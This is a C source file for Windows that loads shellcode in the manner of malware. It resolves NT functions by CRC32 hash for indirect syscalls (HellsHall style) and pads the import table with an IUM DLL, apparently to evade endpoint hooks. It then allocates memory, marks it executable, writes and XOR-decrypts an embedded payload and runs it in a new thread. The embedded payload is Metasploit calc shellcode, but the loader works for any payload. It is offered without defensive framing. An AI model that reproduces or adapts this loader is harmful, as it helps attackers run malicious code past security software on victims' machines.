#include <stdio.h>
#include <windows.h>

#include "Structs.h"
#include "HellsHall.h"
#include "IumSyscalls.h"

#define XOR_KEY                          0x71

#define NtAllocateVirtualMemory_CRC32    0xF0715D9B
#define NtProtectVirtualMemory_CRC32     0x8125300D
#define NtWriteVirtualMemory_CRC32       0xB283E5FE
#define NtCreateThreadEx_CRC32			 0xC4BB8E6D
#define NtWaitForSingleObject_CRC32      0xD80315EE

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL  NtAllocateVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL  NtWriteVirtualMemory;
	NT_SYSCALL  NtCreateThreadEx;
	NT_SYSCALL  NtWaitForSingleObject;

} NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC g_NTAPI = { 0 };

// -------------------------------- //// -------------------------------- //// -------------------------------- //

static BOOL InitIndirectSyscalls(void) {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &g_NTAPI.NtAllocateVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_NTAPI.NtProtectVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtWriteVirtualMemory_CRC32, &g_NTAPI.NtWriteVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_NTAPI.NtCreateThreadEx)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_NTAPI.NtWaitForSingleObject)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
		return FALSE;
	}

	return TRUE;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //


static VOID XorByOneKey(IN PBYTE pBuffer, IN SIZE_T sBufferSize, IN BYTE bKey) {

	for (size_t i = 0; i < sBufferSize; i++) {

		pBuffer[i] = pBuffer[i] ^ bKey;
	}
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

static BOOL InjectShellcodeViaIndirectSyscalls(IN HANDLE hProcess, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	NTSTATUS	STATUS = 0x00;
	PBYTE		pTmpBuffer = NULL;
	SIZE_T		sTmpPayloadSize = sShellcodeSize;
	SIZE_T      sNumberOfBytesWritten = 0x00;
	DWORD		dwOldProtection = 0x00;
	HANDLE		hThread = NULL;
	BOOL        bSuccess = FALSE;

	SET_SYSCALL(g_NTAPI.NtAllocateVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, &pTmpBuffer, 0x00, &sTmpPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) || pTmpBuffer == NULL) {
		printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		goto CLEANUP;
	}

	printf("[+] pTmpBuffer     : 0x%p \n", pTmpBuffer);

	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, &pTmpBuffer, &sTmpPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		goto CLEANUP;
	}

	if (hProcess != NtCurrentProcess()) {

		SET_SYSCALL(g_NTAPI.NtWriteVirtualMemory);
		if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, pTmpBuffer, pShellcodeAddress, sShellcodeSize, &sNumberOfBytesWritten))) || sNumberOfBytesWritten != sShellcodeSize) {
			printf("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
			goto CLEANUP;
		}
	}
	else
		memcpy(pTmpBuffer, pShellcodeAddress, sShellcodeSize);

	printf("\n[*] Press any key to decrypt... \n");
	getchar();

	XorByOneKey(pTmpBuffer, sShellcodeSize, (BYTE)XOR_KEY);

	SET_SYSCALL(g_NTAPI.NtCreateThreadEx);
	if (!NT_SUCCESS((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pTmpBuffer, NULL, FALSE, NULL, NULL, NULL, NULL)))) {
		printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X\n", STATUS);
		goto CLEANUP;
	}

	if (phThread) { *phThread = hThread; }
	
	*ppInjectionAddress = pTmpBuffer;

	SET_SYSCALL(g_NTAPI.NtWaitForSingleObject);
	if (!NT_SUCCESS((STATUS = RunSyscall(hThread, FALSE, NULL)))) {
		printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
		goto CLEANUP;
	}

	bSuccess = TRUE;

CLEANUP:
	if (pTmpBuffer) { RtlSecureZeroMemory(pTmpBuffer, sTmpPayloadSize); }
	if (hThread && hThread != NtCurrentThread()) { CloseHandle(hThread); }
	if (hProcess && hProcess != NtCurrentProcess()) { CloseHandle(hProcess); }
	return bSuccess;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //


int main(void) {
	// x64 metasploit calc - XOR encrypted
	UCHAR  uPayload[] = { 0x8d, 0x39, 0xf2, 0x95, 0x81, 0x99, 0xb1, 0x71, 0x71, 0x71, 0x30, 0x20, 0x30, 0x21, 0x23, 0x20, 0x27, 0x39, 0x40, 0xa3, 0x14, 0x39, 0xfa, 0x23, 0x11, 0x39, 0xfa, 0x23, 0x69, 0x39, 0xfa, 0x23, 0x51, 0x39, 0xfa, 0x03, 0x21, 0x39, 0x7e, 0xc6, 0x3b, 0x3b, 0x3c, 0x40, 0xb8, 0x39, 0x40, 0xb1, 0xdd, 0x4d, 0x10, 0x0d, 0x73, 0x5d, 0x51, 0x30, 0xb0, 0xb8, 0x7c, 0x30, 0x70, 0xb0, 0x93, 0x9c, 0x23, 0x30, 0x20, 0x39, 0xfa, 0x23, 0x51, 0xfa, 0x33, 0x4d, 0x39, 0x70, 0xa1, 0xfa, 0xf1, 0xf9, 0x71, 0x71, 0x71, 0x39, 0xf4, 0xb1, 0x05, 0x16, 0x39, 0x70, 0xa1, 0x21, 0xfa, 0x39, 0x69, 0x35, 0xfa, 0x31, 0x51, 0x38, 0x70, 0xa1, 0x92, 0x27, 0x39, 0x8e, 0xb8, 0x30, 0xfa, 0x45, 0xf9, 0x39, 0x70, 0xa7, 0x3c, 0x40, 0xb8, 0x39, 0x40, 0xb1, 0xdd, 0x30, 0xb0, 0xb8, 0x7c, 0x30, 0x70, 0xb0, 0x49, 0x91, 0x04, 0x80, 0x3d, 0x72, 0x3d, 0x55, 0x79, 0x34, 0x48, 0xa0, 0x04, 0xa9, 0x29, 0x35, 0xfa, 0x31, 0x55, 0x38, 0x70, 0xa1, 0x17, 0x30, 0xfa, 0x7d, 0x39, 0x35, 0xfa, 0x31, 0x6d, 0x38, 0x70, 0xa1, 0x30, 0xfa, 0x75, 0xf9, 0x39, 0x70, 0xa1, 0x30, 0x29, 0x30, 0x29, 0x2f, 0x28, 0x2b, 0x30, 0x29, 0x30, 0x28, 0x30, 0x2b, 0x39, 0xf2, 0x9d, 0x51, 0x30, 0x23, 0x8e, 0x91, 0x29, 0x30, 0x28, 0x2b, 0x39, 0xfa, 0x63, 0x98, 0x26, 0x8e, 0x8e, 0x8e, 0x2c, 0x39, 0xcb, 0x70, 0x71, 0x71, 0x71, 0x71, 0x71, 0x71, 0x71, 0x39, 0xfc, 0xfc, 0x70, 0x70, 0x71, 0x71, 0x30, 0xcb, 0x40, 0xfa, 0x1e, 0xf6, 0x8e, 0xa4, 0xca, 0x91, 0x6c, 0x5b, 0x7b, 0x30, 0xcb, 0xd7, 0xe4, 0xcc, 0xec, 0x8e, 0xa4, 0x39, 0xf2, 0xb5, 0x59, 0x4d, 0x77, 0x0d, 0x7b, 0xf1, 0x8a, 0x91, 0x04, 0x74, 0xca, 0x36, 0x62, 0x03, 0x1e, 0x1b, 0x71, 0x28, 0x30, 0xf8, 0xab, 0x8e, 0xa4, 0x12, 0x10, 0x1d, 0x12, 0x5f, 0x14, 0x09, 0x14, 0x71 };
	PVOID  pInjectionAddress  = NULL;

	AddIumdllToIAT();

	if (!InitIndirectSyscalls())
		return -1;

	if (!InjectShellcodeViaIndirectSyscalls(NtCurrentProcess(), (PBYTE)uPayload, sizeof(uPayload), &pInjectionAddress, NULL))
		return -1;

	return 0;

}